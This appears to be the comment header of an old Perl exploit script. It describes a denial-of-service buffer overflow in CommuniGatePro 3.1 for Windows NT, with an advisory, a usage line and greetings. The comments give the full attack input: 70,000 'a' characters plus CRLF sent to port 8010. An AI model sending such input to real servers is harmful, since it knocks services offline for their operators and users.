# DoS Attack against CommuniGatePro 3.1 for Windows NT
# Exploit coded and discovered by bansh33 [bansh33@r00tabega.com]
# 
# <advisory>
# CommuniGate is an Internet messaging server application implementing
# various services including SMTP, IMAP, and POP3.
# It does, however, contain a simple buffer overflow as follows:
# It listens for connections on port 8010 (http configuration from remote browser)
# and crashes when sent 70,000 of "a" + "\r\n"
# Solution: Upgrade to version 3.2
# </advisory>
#
# <usage>
# ./communigate.pl [remote server]
# </usage>

# E-dub, Sys-Edit, ragnarox, sku||, Axtrex, busdr1v3r, Griffon, Tutor, Ashmodai
# and my mommy and daddy cuz they make me drink my milk =)
